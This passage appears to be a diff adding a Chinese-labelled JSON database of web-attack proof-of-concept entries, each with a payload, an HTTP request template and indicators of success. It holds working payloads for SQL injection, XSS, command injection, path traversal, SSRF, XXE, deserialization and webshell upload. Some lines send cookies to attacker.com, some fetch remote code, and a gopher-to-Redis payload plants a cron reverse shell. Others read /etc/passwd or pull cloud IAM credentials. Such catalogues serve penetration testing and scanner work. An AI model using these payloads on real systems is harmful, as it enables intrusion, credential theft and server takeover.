@@ -1,0 +1,1526 @@
+{
+  "poc-8e2c40dc": {
+    "poc_id": "poc-8e2c40dc",
+    "name": "SQL注入 - 联合查询",
+    "vuln_type": "sql_injection",
+    "severity": "critical",
+    "cwe_id": "CWE-89",
+    "cve_id": "",
+    "description": "通过UNION SELECT联合查询获取数据库数据",
+    "impact": "数据库数据泄露、认证绕过、数据篡改",
+    "remediation": "使用参数化查询/预编译语句，禁止字符串拼接SQL",
+    "targets": [
+      "web",
+      "api"
+    ],
+    "prerequisites": [
+      "参数可控",
+      "错误回显或联合查询可用"
+    ],
+    "payload": "' UNION SELECT NULL,username,password FROM users--",
+    "poc_code": "",
+    "request_template": "GET /vuln.php?id=1{payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "用户名",
+      "密码",
+      "admin",
+      "root@",
+      "password hash"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "sql",
+      "union",
+      "data_exfiltration"
+    ],
+    "created_at": 1788087092.711029,
+    "updated_at": 1788087092.7110295
+  },
+  "poc-97592d0e": {
+    "poc_id": "poc-97592d0e",
+    "name": "SQL注入 - 报错注入",
+    "vuln_type": "sql_injection",
+    "severity": "critical",
+    "cwe_id": "CWE-89",
+    "cve_id": "",
+    "description": "通过数据库报错信息获取数据",
+    "impact": "数据库数据泄露",
+    "remediation": "使用参数化查询，关闭生产环境错误回显",
+    "targets": [
+      "web",
+      "api"
+    ],
+    "prerequisites": [
+      "参数可控",
+      "数据库错误回显"
+    ],
+    "payload": "' AND extractvalue(1,concat(0x7e,(SELECT user())))--",
+    "poc_code": "",
+    "request_template": "GET /vuln.php?id=1{payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "XPATH syntax error",
+      "Duplicate entry",
+      "root@",
+      "database name"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "sql",
+      "error_based",
+      "mysql"
+    ],
+    "created_at": 1788087092.7110438,
+    "updated_at": 1788087092.711044
+  },
+  "poc-8cb549c6": {
+    "poc_id": "poc-8cb549c6",
+    "name": "SQL注入 - 时间盲注",
+    "vuln_type": "sql_injection",
+    "severity": "high",
+    "cwe_id": "CWE-89",
+    "cve_id": "",
+    "description": "通过SLEEP/BENCHMARK等函数进行时间延迟盲注",
+    "impact": "数据库数据泄露（速度较慢）",
+    "remediation": "使用参数化查询",
+    "targets": [
+      "web",
+      "api"
+    ],
+    "prerequisites": [
+      "参数可控",
+      "无回显但有时间延迟"
+    ],
+    "payload": "' AND SLEEP(5)--",
+    "poc_code": "",
+    "request_template": "GET /vuln.php?id=1{payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "响应时间>5秒",
+      "延迟明显增加"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "sql",
+      "time_based",
+      "blind"
+    ],
+    "created_at": 1788087092.711052,
+    "updated_at": 1788087092.7110522
+  },
+  "poc-df968c20": {
+    "poc_id": "poc-df968c20",
+    "name": "SQL注入 - 布尔盲注",
+    "vuln_type": "sql_injection",
+    "severity": "high",
+    "cwe_id": "CWE-89",
+    "cve_id": "",
+    "description": "通过页面真假状态进行布尔盲注",
+    "impact": "数据库数据泄露",
+    "remediation": "使用参数化查询",
+    "targets": [
+      "web",
+      "api"
+    ],
+    "prerequisites": [
+      "参数可控",
+      "页面有真假两种状态"
+    ],
+    "payload": "' AND 1=1-- / ' AND 1=2--",
+    "poc_code": "",
+    "request_template": "GET /vuln.php?id=1{payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "1=1时页面正常",
+      "1=2时页面异常/空"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "sql",
+      "boolean_based",
+      "blind"
+    ],
+    "created_at": 1788087092.7110581,
+    "updated_at": 1788087092.7110581
+  },
+  "poc-bd8387c6": {
+    "poc_id": "poc-bd8387c6",
+    "name": "SQL注入 - 堆叠查询",
+    "vuln_type": "sql_injection",
+    "severity": "critical",
+    "cwe_id": "CWE-89",
+    "cve_id": "",
+    "description": "通过分号执行多条SQL语句",
+    "impact": "数据篡改、删除、权限提升",
+    "remediation": "使用参数化查询，禁止多语句执行",
+    "targets": [
+      "web",
+      "api"
+    ],
+    "prerequisites": [
+      "参数可控",
+      "数据库支持堆叠查询（MSSQL/PostgreSQL）"
+    ],
+    "payload": "; INSERT INTO users(username,password) VALUES('hacker','hacked')--",
+    "poc_code": "",
+    "request_template": "GET /vuln.php?id=1{payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "新用户创建成功",
+      "数据被修改"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "sql",
+      "stacked",
+      "data_manipulation"
+    ],
+    "created_at": 1788087092.711065,
+    "updated_at": 1788087092.711065
+  },
+  "poc-b5393813": {
+    "poc_id": "poc-b5393813",
+    "name": "XSS - 反射型",
+    "vuln_type": "xss",
+    "severity": "high",
+    "cwe_id": "CWE-79",
+    "cve_id": "",
+    "description": "用户输入未经过滤直接反射到页面",
+    "impact": "Cookie窃取、会话劫持、钓鱼、键盘记录",
+    "remediation": "对输出进行HTML编码，使用CSP",
+    "targets": [
+      "web"
+    ],
+    "prerequisites": [
+      "参数可控",
+      "参数值反射到HTML中"
+    ],
+    "payload": "<script>alert(document.cookie)</script>",
+    "poc_code": "",
+    "request_template": "GET /search?q={payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "<script>alert",
+      "payload未编码反射",
+      "弹窗"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "xss",
+      "reflected",
+      "cookie_theft"
+    ],
+    "created_at": 1788087092.7110703,
+    "updated_at": 1788087092.7110703
+  },
+  "poc-4dc9dd07": {
+    "poc_id": "poc-4dc9dd07",
+    "name": "XSS - 存储型",
+    "vuln_type": "xss",
+    "severity": "critical",
+    "cwe_id": "CWE-79",
+    "cve_id": "",
+    "description": "恶意脚本存储在数据库中，其他用户访问时执行",
+    "impact": "大规模Cookie窃取、会话劫持、蠕虫传播",
+    "remediation": "对输入和输出都进行过滤和编码",
+    "targets": [
+      "web",
+      "forum",
+      "comment"
+    ],
+    "prerequisites": [
+      "有输入存储功能",
+      "输入内容展示给其他用户"
+    ],
+    "payload": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
+    "poc_code": "",
+    "request_template": "POST /comment HTTP/1.1\nHost: {target}\n\ncontent={payload}",
+    "response_indicators": [
+      "脚本在其他用户页面执行",
+      "Cookie被发送到攻击者服务器"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "xss",
+      "stored",
+      "worm",
+      "session_hijacking"
+    ],
+    "created_at": 1788087092.7110758,
+    "updated_at": 1788087092.7110758
+  },
+  "poc-6ab07341": {
+    "poc_id": "poc-6ab07341",
+    "name": "XSS - DOM型",
+    "vuln_type": "xss",
+    "severity": "high",
+    "cwe_id": "CWE-79",
+    "cve_id": "",
+    "description": "客户端JavaScript直接操作DOM导致的XSS",
+    "impact": "Cookie窃取、会话劫持",
+    "remediation": "使用textContent代替innerHTML，对用户输入进行编码",
+    "targets": [
+      "web"
+    ],
+    "prerequisites": [
+      "页面JS使用innerHTML/document.write等操作DOM",
+      "用户输入可控"
+    ],
+    "payload": "<img src=x onerror=alert(document.domain)>",
+    "poc_code": "",
+    "request_template": "GET /#!{payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "JS执行",
+      "弹窗",
+      "DOM被修改"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "xss",
+      "dom",
+      "client_side"
+    ],
+    "created_at": 1788087092.711081,
+    "updated_at": 1788087092.7110813
+  },
+  "poc-027cbb85": {
+    "poc_id": "poc-027cbb85",
+    "name": "XSS - CSP绕过",
+    "vuln_type": "xss",
+    "severity": "high",
+    "cwe_id": "CWE-79",
+    "cve_id": "",
+    "description": "通过JSONP、Angular沙箱逃逸等方式绕过CSP",
+    "impact": "在有CSP保护的页面执行XSS",
+    "remediation": "严格配置CSP，禁止unsafe-inline和unsafe-eval",
+    "targets": [
+      "web"
+    ],
+    "prerequisites": [
+      "页面有CSP但配置不严",
+      "存在JSONP端点或AngularJS"
+    ],
+    "payload": "<script src=//attacker.com/csp.js></script> / {{constructor.constructor('alert(1)')()}}",
+    "poc_code": "",
+    "request_template": "GET /search?q={payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "脚本执行",
+      "CSP未拦截"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "xss",
+      "csp_bypass",
+      "jsonp",
+      "angular"
+    ],
+    "created_at": 1788087092.711086,
+    "updated_at": 1788087092.7110863
+  },
+  "poc-999951be": {
+    "poc_id": "poc-999951be",
+    "name": "XSS - SVG/XML外部实体",
+    "vuln_type": "xss",
+    "severity": "medium",
+    "cwe_id": "CWE-79",
+    "cve_id": "",
+    "description": "通过SVG文件中的脚本执行XSS",
+    "impact": "Cookie窃取、钓鱼",
+    "remediation": "禁止上传SVG，或对SVG进行净化",
+    "targets": [
+      "web",
+      "upload"
+    ],
+    "prerequisites": [
+      "支持SVG上传",
+      "SVG在浏览器中渲染"
+    ],
+    "payload": "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.cookie)'/>",
+    "poc_code": "",
+    "request_template": "POST /upload HTTP/1.1\nHost: {target}\nContent-Type: image/svg+xml\n\n{payload}",
+    "response_indicators": [
+      "SVG加载时执行脚本",
+      "弹窗"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "xss",
+      "svg",
+      "upload",
+      "file_upload"
+    ],
+    "created_at": 1788087092.7110908,
+    "updated_at": 1788087092.7110908
+  },
+  "poc-f3edadf9": {
+    "poc_id": "poc-f3edadf9",
+    "name": "命令注入 - 分号分隔",
+    "vuln_type": "command_injection",
+    "severity": "critical",
+    "cwe_id": "CWE-78",
+    "cve_id": "",
+    "description": "通过分号/&&/||等分隔符注入系统命令",
+    "impact": "远程代码执行、服务器完全控制",
+    "remediation": "使用白名单验证输入，禁止调用系统命令",
+    "targets": [
+      "web",
+      "api",
+      "ping",
+      "traceroute"
+    ],
+    "prerequisites": [
+      "参数可控",
+      "参数被拼接到系统命令中"
+    ],
+    "payload": "; id; whoami; cat /etc/passwd",
+    "poc_code": "",
+    "request_template": "GET /ping?host=127.0.0.1{payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "uid=",
+      "gid=",
+      "root:",
+      "bin:",
+      "daemon:"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "rce",
+      "command_injection",
+      "linux"
+    ],
+    "created_at": 1788087092.711096,
+    "updated_at": 1788087092.711096
+  },
+  "poc-e19d0555": {
+    "poc_id": "poc-e19d0555",
+    "name": "命令注入 - 管道符",
+    "vuln_type": "command_injection",
+    "severity": "critical",
+    "cwe_id": "CWE-78",
+    "cve_id": "",
+    "description": "通过管道符|注入命令",
+    "impact": "远程代码执行",
+    "remediation": "使用白名单验证输入",
+    "targets": [
+      "web",
+      "api"
+    ],
+    "prerequisites": [
+      "参数可控",
+      "参数被拼接到系统命令中"
+    ],
+    "payload": "| id | whoami",
+    "poc_code": "",
+    "request_template": "GET /ping?host=127.0.0.1{payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "uid=",
+      "root",
+      "命令执行结果"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "rce",
+      "command_injection",
+      "pipe"
+    ],
+    "created_at": 1788087092.7111013,
+    "updated_at": 1788087092.7111015
+  },
+  "poc-ef3d0678": {
+    "poc_id": "poc-ef3d0678",
+    "name": "命令注入 - 反引号/$( )",
+    "vuln_type": "command_injection",
+    "severity": "critical",
+    "cwe_id": "CWE-78",
+    "cve_id": "",
+    "description": "通过反引号或$()执行命令替换",
+    "impact": "远程代码执行",
+    "remediation": "使用白名单验证输入",
+    "targets": [
+      "web",
+      "api"
+    ],
+    "prerequisites": [
+      "参数可控",
+      "参数在shell上下文中执行"
+    ],
+    "payload": "`id` $(whoami)",
+    "poc_code": "",
+    "request_template": "GET /lookup?domain=example.com{payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "uid=",
+      "root",
+      "命令输出被替换"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "rce",
+      "command_injection",
+      "backtick",
+      "substitution"
+    ],
+    "created_at": 1788087092.7111065,
+    "updated_at": 1788087092.7111065
+  },
+  "poc-287105c7": {
+    "poc_id": "poc-287105c7",
+    "name": "目录遍历 - 相对路径",
+    "vuln_type": "path_traversal",
+    "severity": "high",
+    "cwe_id": "CWE-22",
+    "cve_id": "",
+    "description": "通过../遍历目录读取敏感文件",
+    "impact": "敏感文件读取、源代码泄露",
+    "remediation": "规范化路径，使用白名单限制可访问目录",
+    "targets": [
+      "web",
+      "file_download",
+      "view"
+    ],
+    "prerequisites": [
+      "文件路径参数可控"
+    ],
+    "payload": "../../../../etc/passwd",
+    "poc_code": "",
+    "request_template": "GET /download?file={payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "root:",
+      "bin:",
+      "daemon:",
+      "[fonts]",
+      "[extensions]"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "path_traversal",
+      "file_read",
+      "lfi"
+    ],
+    "created_at": 1788087092.711111,
+    "updated_at": 1788087092.711111
+  },
+  "poc-836b0034": {
+    "poc_id": "poc-836b0034",
+    "name": "目录遍历 - 编码绕过",
+    "vuln_type": "path_traversal",
+    "severity": "high",
+    "cwe_id": "CWE-22",
+    "cve_id": "",
+    "description": "通过URL编码/双重编码绕过过滤",
+    "impact": "敏感文件读取",
+    "remediation": "解码后再验证路径",
+    "targets": [
+      "web"
+    ],
+    "prerequisites": [
+      "有简单的../过滤"
+    ],
+    "payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd / ....//....//etc/passwd",
+    "poc_code": "",
+    "request_template": "GET /download?file={payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "root:",
+      "bin:",
+      "敏感文件内容"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "path_traversal",
+      "encoding_bypass",
+      "lfi"
+    ],
+    "created_at": 1788087092.7111156,
+    "updated_at": 1788087092.7111156
+  },
+  "poc-fb148e72": {
+    "poc_id": "poc-fb148e72",
+    "name": "本地文件包含 - PHP伪协议",
+    "vuln_type": "file_inclusion",
+    "severity": "high",
+    "cwe_id": "CWE-98",
+    "cve_id": "",
+    "description": "通过php://filter等伪协议读取源代码或执行代码",
+    "impact": "源代码泄露、远程代码执行",
+    "remediation": "禁用allow_url_include，使用白名单",
+    "targets": [
+      "web",
+      "php"
+    ],
+    "prerequisites": [
+      "PHP环境",
+      "文件包含参数可控"
+    ],
+    "payload": "php://filter/convert.base64-encode/resource=index.php",
+    "poc_code": "",
+    "request_template": "GET /index.php?page={payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "base64编码内容",
+      "PD9waHA",
+      "PHP源代码"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "lfi",
+      "php",
+      "filter",
+      "source_disclosure"
+    ],
+    "created_at": 1788087092.7111197,
+    "updated_at": 1788087092.7111197
+  },
+  "poc-bd5186b8": {
+    "poc_id": "poc-bd5186b8",
+    "name": "远程文件包含 - RFI",
+    "vuln_type": "file_inclusion",
+    "severity": "critical",
+    "cwe_id": "CWE-98",
+    "cve_id": "",
+    "description": "通过包含远程恶意PHP文件执行代码",
+    "impact": "远程代码执行、服务器完全控制",
+    "remediation": "禁用allow_url_include和allow_url_fopen",
+    "targets": [
+      "web",
+      "php"
+    ],
+    "prerequisites": [
+      "PHP环境",
+      "allow_url_include=On",
+      "文件包含参数可控"
+    ],
+    "payload": "http://attacker.com/shell.txt",
+    "poc_code": "",
+    "request_template": "GET /index.php?page={payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "恶意代码执行",
+      "webshell输出",
+      "phpinfo"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "rfi",
+      "rce",
+      "php",
+      "webshell"
+    ],
+    "created_at": 1788087092.7111237,
+    "updated_at": 1788087092.7111237
+  },
+  "poc-059c6896": {
+    "poc_id": "poc-059c6896",
+    "name": "SSRF - 内网探测",
+    "vuln_type": "ssrf",
+    "severity": "high",
+    "cwe_id": "CWE-918",
+    "cve_id": "",
+    "description": "通过服务器端请求伪造探测内网服务",
+    "impact": "内网信息泄露、内网服务访问",
+    "remediation": "限制可访问的URL，使用白名单，禁止访问内网IP",
+    "targets": [
+      "web",
+      "api",
+      "url_fetch",
+      "image_proxy"
+    ],
+    "prerequisites": [
+      "URL参数可控",
+      "服务器发起请求"
+    ],
+    "payload": "http://127.0.0.1:22 / http://169.254.169.254/latest/meta-data/",
+    "poc_code": "",
+    "request_template": "GET /fetch?url={payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "SSH banner",
+      "云元数据",
+      "内网服务响应",
+      "connection refused vs success差异"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "ssrf",
+      "internal_scan",
+      "cloud_metadata"
+    ],
+    "created_at": 1788087092.711128,
+    "updated_at": 1788087092.711128
+  },
+  "poc-be324df6": {
+    "poc_id": "poc-be324df6",
+    "name": "SSRF - 云元数据攻击",
+    "vuln_type": "ssrf",
+    "severity": "critical",
+    "cwe_id": "CWE-918",
+    "cve_id": "",
+    "description": "通过SSRF访问云服务商元数据API获取凭证",
+    "impact": "云服务器凭证窃取、权限提升、数据泄露",
+    "remediation": "禁止访问169.254.169.254，使用IMDSv2",
+    "targets": [
+      "web",
+      "cloud",
+      "aws",
+      "azure",
+      "gcp"
+    ],
+    "prerequisites": [
+      "云服务器环境",
+      "SSRF漏洞"
+    ],
+    "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "poc_code": "",
+    "request_template": "GET /fetch?url={payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "IAM角色名",
+      "AccessKeyId",
+      "SecretAccessKey",
+      "Token"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "ssrf",
+      "cloud",
+      "aws",
+      "metadata",
+      "credential_theft"
+    ],
+    "created_at": 1788087092.7111325,
+    "updated_at": 1788087092.7111325
+  },
+  "poc-b55c4ea2": {
+    "poc_id": "poc-b55c4ea2",
+    "name": "SSRF - Gopher协议利用",
+    "vuln_type": "ssrf",
+    "severity": "critical",
+    "cwe_id": "CWE-918",
+    "cve_id": "",
+    "description": "通过gopher协议攻击内网服务（Redis/MySQL等）",
+    "impact": "内网服务攻击、未授权访问、数据篡改",
+    "remediation": "禁用gopher协议，限制协议白名单",
+    "targets": [
+      "web",
+      "ssrf",
+      "redis",
+      "mysql"
+    ],
+    "prerequisites": [
+      "SSRF支持gopher协议",
+      "内网有未授权服务"
+    ],
+    "payload": "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron/%0ACONFIG%20SET%20dbfilename%20root%0ASET%20x%20%22%5Cn%5Cn*%2F1%20*%20*%20*%20*%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261%5Cn%5Cn%22%0ASAVE%0A",
+    "poc_code": "",
+    "request_template": "GET /fetch?url={payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "Redis响应",
+      "+OK",
+      "定时任务写入成功",
+      "反弹shell"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "ssrf",
+      "gopher",
+      "redis",
+      "rce",
+      "internal"
+    ],
+    "created_at": 1788087092.7111375,
+    "updated_at": 1788087092.7111375
+  },
+  "poc-102062c0": {
+    "poc_id": "poc-102062c0",
+    "name": "XXE - 文件读取",
+    "vuln_type": "xxe",
+    "severity": "high",
+    "cwe_id": "CWE-611",
+    "cve_id": "",
+    "description": "通过XML外部实体读取服务器文件",
+    "impact": "敏感文件读取、源代码泄露",
+    "remediation": "禁用DTD和外部实体，使用JSON",
+    "targets": [
+      "web",
+      "api",
+      "xml",
+      "soap"
+    ],
+    "prerequisites": [
+      "解析用户可控的XML",
+      "未禁用外部实体"
+    ],
+    "payload": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
+    "poc_code": "",
+    "request_template": "POST /api HTTP/1.1\nHost: {target}\nContent-Type: application/xml\n\n{payload}",
+    "response_indicators": [
+      "root:",
+      "bin:",
+      "daemon:",
+      "[fonts]",
+      "[extensions]"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "xxe",
+      "file_read",
+      "xml",
+      "lfi"
+    ],
+    "created_at": 1788087092.7111423,
+    "updated_at": 1788087092.7111423
+  },
+  "poc-87ba0bb6": {
+    "poc_id": "poc-87ba0bb6",
+    "name": "XXE - Blind OOB",
+    "vuln_type": "xxe",
+    "severity": "high",
+    "cwe_id": "CWE-611",
+    "cve_id": "",
+    "description": "通过Blind XXE带外窃取数据",
+    "impact": "敏感文件读取（无回显情况下）",
+    "remediation": "禁用DTD和外部实体",
+    "targets": [
+      "web",
+      "api",
+      "xml"
+    ],
+    "prerequisites": [
+      "解析用户可控的XML",
+      "无回显但可发起外部请求"
+    ],
+    "payload": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]><foo>&send;</foo>",
+    "poc_code": "",
+    "request_template": "POST /api HTTP/1.1\nHost: {target}\nContent-Type: application/xml\n\n{payload}",
+    "response_indicators": [
+      "攻击者服务器收到请求",
+      "DNS日志有记录",
+      "数据通过URL参数外带"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "xxe",
+      "blind",
+      "oob",
+      "data_exfiltration"
+    ],
+    "created_at": 1788087092.7111466,
+    "updated_at": 1788087092.7111466
+  },
+  "poc-32fa9211": {
+    "poc_id": "poc-32fa9211",
+    "name": "PHP反序列化 - POP链",
+    "vuln_type": "deserialization",
+    "severity": "critical",
+    "cwe_id": "CWE-502",
+    "cve_id": "",
+    "description": "通过构造恶意PHP序列化对象触发POP链执行代码",
+    "impact": "远程代码执行、服务器完全控制",
+    "remediation": "避免反序列化不可信数据，使用白名单限制类",
+    "targets": [
+      "web",
+      "php",
+      "laravel",
+      "thinkphp"
+    ],
+    "prerequisites": [
+      "PHP环境",
+      "unserialize用户可控数据",
+      "存在可利用的类"
+    ],
+    "payload": "O:8:\"stdClass\":0:{} / 框架特定POP链",
+    "poc_code": "",
+    "request_template": "POST /login HTTP/1.1\nHost: {target}\nCookie: user={payload}",
+    "response_indicators": [
+      "代码执行",
+      "webshell",
+      "phpinfo",
+      "命令输出"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "deserialization",
+      "php",
+      "pop_chain",
+      "rce"
+    ],
+    "created_at": 1788087092.7111554,
+    "updated_at": 1788087092.7111557
+  },
+  "poc-380b0b3d": {
+    "poc_id": "poc-380b0b3d",
+    "name": "Java反序列化 - CommonsCollections",
+    "vuln_type": "deserialization",
+    "severity": "critical",
+    "cwe_id": "CWE-502",
+    "cve_id": "",
+    "description": "通过Apache CommonsCollections库的反序列化漏洞执行代码",
+    "impact": "远程代码执行、服务器完全控制",
+    "remediation": "升级CommonsCollections到最新版本，禁止反序列化不可信数据",
+    "targets": [
+      "web",
+      "java",
+      "weblogic",
+      "jboss",
+      "shiro"
+    ],
+    "prerequisites": [
+      "Java环境",
+      "存在CommonsCollections库",
+      "反序列化入口"
+    ],
+    "payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgAqY29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLllhbU1vZGVsAX-8JnLh3xQDAARMAApjb21wcmVzc2VkTAAKY29tcG9uZW50c3QAE1tMamF2YS9sYW5nL09iamVjdDtMAA9jb21wcmVzc2VkTWV0aG9kc3EAfgAGTAAWY29tcHJlc3NlZFN0YXRpY01ldGhvZHNxAH4ABkwADmRlY2xhcmluZ0NsYXNzdAASTGphdmEvbGFuZy9DbGFzcztMAAVmaWVsZHNxAH4ABkwACG1lbWJlcnNxAH4ABkwACG1ldGhvZHNxAH4ABkwACm5hbWVJbmZvc3EAfgABTAAGc2lnbmF0dXJlcQB+AAFMAA1zdXBlckNsYXNzTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAB4cHBwcHBwcHBwcHBweA==",
+    "poc_code": "",
+    "request_template": "POST /invoker/readonly HTTP/1.1\nHost: {target}\nContent-Type: application/octet-stream\n\n{payload}",
+    "response_indicators": [
+      "代码执行",
+      "命令输出",
+      "webshell",
+      "500错误包含栈信息"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "deserialization",
+      "java",
+      "commonscollections",
+      "weblogic",
+      "rce"
+    ],
+    "created_at": 1788087092.7111607,
+    "updated_at": 1788087092.7111607
+  },
+  "poc-25303441": {
+    "poc_id": "poc-25303441",
+    "name": "Python反序列化 - Pickle",
+    "vuln_type": "deserialization",
+    "severity": "critical",
+    "cwe_id": "CWE-502",
+    "cve_id": "",
+    "description": "通过构造恶意Pickle数据执行任意代码",
+    "impact": "远程代码执行",
+    "remediation": "避免反序列化不可信数据，使用JSON",
+    "targets": [
+      "web",
+      "python",
+      "django",
+      "flask"
+    ],
+    "prerequisites": [
+      "Python环境",
+      "pickle.loads用户可控数据"
+    ],
+    "payload": "cos\nsystem\n(S'id'\ntR.",
+    "poc_code": "",
+    "request_template": "POST /api HTTP/1.1\nHost: {target}\nContent-Type: application/octet-stream\n\n{payload}",
+    "response_indicators": [
+      "uid=",
+      "gid=",
+      "命令执行输出",
+      "500错误"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "deserialization",
+      "python",
+      "pickle",
+      "rce"
+    ],
+    "created_at": 1788087092.711165,
+    "updated_at": 1788087092.711165
+  },
+  "poc-af8e7875": {
+    "poc_id": "poc-af8e7875",
+    "name": "文件上传 - 类型绕过",
+    "vuln_type": "file_upload",
+    "severity": "critical",
+    "cwe_id": "CWE-434",
+    "cve_id": "",
+    "description": "通过修改Content-Type或文件头绕过上传过滤",
+    "impact": "Webshell上传、远程代码执行",
+    "remediation": "白名单验证文件类型，重命名文件，存储在非Web可访问目录",
+    "targets": [
+      "web",
+      "upload",
+      "avatar"
+    ],
+    "prerequisites": [
+      "有文件上传功能",
+      "过滤不严"
+    ],
+    "payload": "GIF89a<?php system($_GET['cmd']); ?>",
+    "poc_code": "",
+    "request_template": "POST /upload HTTP/1.1\nHost: {target}\nContent-Type: multipart/form-data; boundary=----\n\n------\nContent-Disposition: form-data; name='file'; filename='shell.php.gif'\nContent-Type: image/gif\n\n{payload}\n------",
+    "response_indicators": [
+      "文件上传成功",
+      "访问文件执行PHP",
+      "命令输出"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "file_upload",
+      "webshell",
+      "type_bypass",
+      "rce"
+    ],
+    "created_at": 1788087092.711169,
+    "updated_at": 1788087092.7111692
+  },
+  "poc-03170dc4": {
+    "poc_id": "poc-03170dc4",
+    "name": "文件上传 - .htaccess",
+    "vuln_type": "file_upload",
+    "severity": "critical",
+    "cwe_id": "CWE-434",
+    "cve_id": "",
+    "description": "上传.htaccess文件将特定扩展名解析为PHP",
+    "impact": "Webshell上传、远程代码执行",
+    "remediation": "禁止上传.htaccess，Apache配置禁止覆盖",
+    "targets": [
+      "web",
+      "apache",
+      "upload"
+    ],
+    "prerequisites": [
+      "Apache服务器",
+      "允许上传.htaccess"
+    ],
+    "payload": "AddType application/x-httpd-php .jpg",
+    "poc_code": "",
+    "request_template": "POST /upload HTTP/1.1\nHost: {target}\n\n.htaccess内容: {payload}\n然后上传shell.jpg包含PHP代码",
+    "response_indicators": [
+      ".htaccess上传成功",
+      "jpg文件被解析为PHP",
+      "命令执行"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "file_upload",
+      "htaccess",
+      "apache",
+      "webshell",
+      "rce"
+    ],
+    "created_at": 1788087092.7111738,
+    "updated_at": 1788087092.7111738
+  },
+  "poc-4ee6dafe": {
+    "poc_id": "poc-4ee6dafe",
+    "name": "文件上传 - 解析漏洞",
+    "vuln_type": "file_upload",
+    "severity": "high",
+    "cwe_id": "CWE-434",
+    "cve_id": "",
+    "description": "利用IIS/Nginx/Apache解析漏洞执行脚本",
+    "impact": "Webshell上传、远程代码执行",
+    "remediation": "升级服务器软件，正确配置解析规则",
+    "targets": [
+      "web",
+      "iis",
+      "nginx",
+      "apache"
+    ],
+    "prerequisites": [
+      "存在解析漏洞的服务器版本"
+    ],
+    "payload": "shell.php.jpg / shell.jpg%00.php / shell.php;.jpg",
+    "poc_code": "",
+    "request_template": "POST /upload HTTP/1.1\nHost: {target}\n\n上传{payload}，然后访问对应URL",
+    "response_indicators": [
+      "文件被解析为脚本",
+      "PHP代码执行",
+      "命令输出"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "file_upload",
+      "parsing_vulnerability",
+      "iis",
+      "nginx",
+      "webshell"
+    ],
